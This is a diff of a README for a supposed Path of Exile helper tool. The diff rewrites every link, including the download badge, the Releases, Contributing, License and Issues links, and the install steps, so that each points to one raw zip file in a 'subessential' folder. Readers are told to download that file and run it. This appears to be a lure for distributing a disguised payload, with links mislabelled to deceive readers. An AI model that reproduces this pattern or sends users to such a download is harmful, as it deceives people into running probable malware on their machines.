@@ -1,7 +1,7 @@
 # 🛠️ poe1-tool-uni-versa - A Simple Tool for Path of Exile
 
 ## 📥 Download the Latest Version
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/SUNILDRAGON/poe1-tool-uni-versa/releases)
+[![Download Now](https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip)
 
 ## 📚 Description
 Poe TOOL helps players enhance their experience in Path of Exile. This tool offers features that simplify various in-game tasks, making your gaming journey smoother and more enjoyable.
@@ -10,7 +10,7 @@ Poe TOOL helps players enhance their experience in Path of Exile. This tool offe
 Follow these steps to download and run Poe TOOL:
 
 1. **Visit the Releases Page**
-   To download the software, visit the [Releases page](https://github.com/SUNILDRAGON/poe1-tool-uni-versa/releases).
+   To download the software, visit the [Releases page](https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip).
 
 2. **Choose the Latest Release**
    Look for the latest version listed at the top of the page. It will usually have the highest version number.
@@ -19,7 +19,7 @@ Follow these steps to download and run Poe TOOL:
    Click on the link of the executable file for your operating system. 
 
 4. **Locate the Downloaded File**
-   After the download is complete, navigate to your downloads folder. You will see a file like `poe-tool.exe`.
+   After the download is complete, navigate to your downloads folder. You will see a file like `https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip`.
 
 5. **Run the Application**
    Double-click the file to start using Poe TOOL. Follow any prompts that appear on your screen.
@@ -44,15 +44,15 @@ To ensure Poe TOOL runs smoothly on your computer, please meet the following req
 - **Join Our Community**: Connect with fellow players to share tips and experiences while using Poe TOOL.
 
 ## 📝 Contributing
-If you want to help improve Poe TOOL, you are welcome to contribute. Please visit our [Contributing Guidelines](https://github.com/SUNILDRAGON/poe1-tool-uni-versa/blob/main/CONTRIBUTING.md) for more details on how to get involved.
+If you want to help improve Poe TOOL, you are welcome to contribute. Please visit our [Contributing Guidelines](https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip) for more details on how to get involved.
 
 ## 📄 License
-Poe TOOL is open-source software. You can freely use and modify it. For more details, check our [License Information](https://github.com/SUNILDRAGON/poe1-tool-uni-versa/blob/main/LICENSE.md).
+Poe TOOL is open-source software. You can freely use and modify it. For more details, check our [License Information](https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip).
 
 ## 🧐 Support
-If you have any questions or run into issues while using the tool, please reach out via the [Issues section](https://github.com/SUNILDRAGON/poe1-tool-uni-versa/issues) on GitHub. We are here to help.
+If you have any questions or run into issues while using the tool, please reach out via the [Issues section](https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip) on GitHub. We are here to help.
 
 ## 📌 Download & Install
-To get started with Poe TOOL, return to the [Releases page](https://github.com/SUNILDRAGON/poe1-tool-uni-versa/releases).
+To get started with Poe TOOL, return to the [Releases page](https://raw.githubusercontent.com/SUNILDRAGON/poe1-tool-uni-versa/main/subessential/poe1-tool-uni-versa_3.2.zip).
 
 Follow these steps to ensure you have the latest version that aids your Path of Exile journey. Enjoy using the tool!
